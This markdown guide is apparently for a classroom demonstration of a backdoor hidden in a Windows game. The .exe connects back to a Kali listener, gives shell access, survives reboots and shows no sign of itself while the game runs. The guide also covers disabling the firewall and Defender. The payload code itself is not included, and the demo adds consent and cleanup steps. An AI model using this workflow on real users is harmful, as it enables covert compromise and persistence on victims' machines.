# Simple Setup Guide - Kali (You) → Windows (Colleague)

## The Simple Explanation

**You (Kali Linux)** → Give .exe to → **Colleague (Windows)** → They run game → **You get their shell**

---

## Step-by-Step Setup

### STEP 1: On Your Kali Linux (Before Meeting)

#### 1.1 Get Your Kali IP Address
```bash
ip addr show
```
Look for something like: `192.168.1.100` (your IP)

#### 1.2 Edit config.py
```bash
nano config.py
```

Change this line to YOUR Kali IP:
```python
LISTENER_HOST = '192.168.1.100'  # Put YOUR Kali IP here
```

Save: `Ctrl+X`, then `Y`, then `Enter`

#### 1.3 Build the Windows .exe
```bash
python3 build_windows_exe.py
```

This creates: `dist/AlienInvasion.exe`

#### 1.4 Prepare Files for Your Colleague

Copy these to a USB drive or zip them:
- `dist/AlienInvasion.exe`
- `images/` folder (the whole folder)

**Folder structure on USB:**
```
USB Drive/
├── AlienInvasion.exe
└── images/
    ├── ship.png
    ├── alien.png
    └── Pasted image.png
```

---

### STEP 2: On Presentation Day

#### 2.1 You (Kali Linux) - Start Listener FIRST
```bash
cd ~/Documents/Space-Shooter
python3 listener.py
```

You'll see:
```
[*] Listener started on 0.0.0.0:4444
[*] Waiting for connection...
```

**Keep this terminal open and wait...**

#### 2.2 Your Colleague (Windows) - Run the Game

1. Copy the files from USB to their Desktop
2. Make sure folder looks like:
   ```
   Desktop/AlienInvasion/
   ├── AlienInvasion.exe
   └── images/
       ├── ship.png
       ├── alien.png
       └── Pasted image.png
   ```
3. Double-click `AlienInvasion.exe`
4. Read the consent message
5. Type `YES` and press Enter
6. Game starts!

#### 2.3 You (Kali Linux) - You're In!

Your terminal will show:
```
[+] Connection received from 192.168.1.50:xxxxx
[*] Shell access established.

shell>
```

**Now you have access to their Windows shell!**

---

## What to Do Once Connected

### Try These Commands:

```bash
# See who they are
shell> whoami

# See their computer name
shell> hostname

# List files in their directory
shell> dir

# See their IP address
shell> ipconfig

# See running programs
shell> tasklist

# See system information
shell> systeminfo
```

---

## Demo Flow for Presentation

### 1. Introduction (1 minute)
"We created a game that demonstrates backdoor functionality. I'm on Kali Linux, my colleague is on Windows."

### 2. Show Your Setup (1 minute)
- Show Kali terminal
- Show listener running
- Explain: "I'm waiting for the target to connect"

### 3. Colleague Runs Game (1 minute)
- They double-click the .exe
- Show consent dialog (transparency)
- Game starts and runs normally

### 4. Show Connection (2 minutes)
- Switch back to your Kali terminal
- Show connection received
- Execute commands:
  ```bash
  shell> whoami
  shell> hostname
  shell> dir
  shell> ipconfig
  ```

### 5. Show Game Still Running (30 seconds)
- Switch to Windows
- Game is playing normally
- No interruption, no indication of backdoor

### 6. Show Persistence (2 minutes)
- Restart Windows computer
- Game auto-starts
- You get connection again automatically

### 7. Show Cleanup (1 minute)
- Run cleanup tool
- Show persistence removed
- Explain how to detect and prevent

### 8. Explain Defenses (2 minutes)
- How to detect: `netstat -an`, Task Manager
- How to prevent: Antivirus, don't run unknown .exe files
- Ethical considerations

---

## Troubleshooting

### Problem: No Connection

**Check 1 - Same Network?**
```bash
# On Kali
ip addr show

# On Windows (cmd)
ping YOUR_KALI_IP
```
Both must be on same WiFi/network!

**Check 2 - Firewall?**
```bash
# On Kali
sudo ufw allow 4444
# or
sudo ufw disable
```

**Check 3 - Correct IP in config.py?**
- Must match your Kali IP exactly
- If IP changed, rebuild the .exe

**Check 4 - Listener Running First?**
- Always start listener BEFORE running game

### Problem: Windows Defender Blocks It

**Expected!** It's a backdoor, so antivirus will flag it.

**For Testing:**
1. Windows Security → Virus & threat protection
2. Manage settings → Add exclusion
3. Add folder: `C:\Users\[Name]\Desktop\AlienInvasion`

Or temporarily disable Real-time protection (testing only!)

### Problem: Game Won't Start

**Check:**
- Is `images/` folder in same directory as .exe?
- Are all 3 images present in the folder?
- Try running from Command Prompt to see errors

---

## Quick Reference Card

### Before Presentation:
- [ ] Get Kali IP: `ip addr show`
- [ ] Update config.py with your IP
- [ ] Build .exe: `python3 build_windows_exe.py`
- [ ] Copy .exe + images folder to USB
- [ ] Test on a Windows VM first!

### During Presentation:
1. **You:** Start listener: `python3 listener.py`
2. **Colleague:** Run `AlienInvasion.exe`
3. **You:** Execute commands when connected
4. **Colleague:** Restart computer (show persistence)
5. **Colleague:** Run cleanup tool
6. **You:** Explain defenses and ethics

---

## Important Notes

### Network Requirements:
- Both computers must be on **same network** (same WiFi)
- Or use VMs with bridged networking
- Test connectivity with `ping` before presentation

### Timing:
- Start listener FIRST (you)
- Then run game (colleague)
- Connection happens in ~3 seconds

### If Something Goes Wrong:
- Have a backup video recording of it working
- Have screenshots ready
- Explain what SHOULD happen

---

## The Absolute Minimum You Need

### Files to Give Colleague:
```
AlienInvasion.exe
images/ship.png
images/alien.png
images/Pasted image.png
```

### Commands You Need to Know:
```bash
# On Kali (you)
python3 listener.py

# On Windows (colleague)
# Just double-click AlienInvasion.exe
```

That's it! Simple as that.

---

## Expected Results

### ✅ What Should Happen:
1. Colleague runs game → sees consent dialog
2. Colleague types YES → game starts
3. You see "Connection received" on Kali
4. You can execute Windows commands
5. Game keeps running normally
6. After restart, game auto-starts
7. Cleanup tool removes everything

### ❌ What Might Go Wrong:
1. Different networks → no connection
2. Firewall blocking → no connection
3. Wrong IP in config.py → no connection
4. Antivirus blocking → game won't run
5. Missing images folder → game crashes

**Solution:** Test everything the day before!

---

## Final Checklist

**Day Before Presentation:**
- [ ] Test on Windows VM
- [ ] Verify connection works
- [ ] Test persistence (restart)
- [ ] Test cleanup tool
- [ ] Prepare backup plan (video/screenshots)

**Day of Presentation:**
- [ ] Kali laptop charged
- [ ] Colleague's Windows laptop ready
- [ ] Both on same WiFi
- [ ] USB with files ready
- [ ] Listener script ready to run
- [ ] Documentation printed

**During Presentation:**
- [ ] Explain educational purpose
- [ ] Show consent dialog (transparency)
- [ ] Demonstrate shell access
- [ ] Show persistence
- [ ] Show cleanup
- [ ] Explain defenses
- [ ] Discuss ethics

---

## One-Liner Summary

**You give colleague a game .exe → They run it → You get their Windows shell from your Kali Linux**

That's the whole project! 🎯

Good luck with your presentation on March 18! 🚀
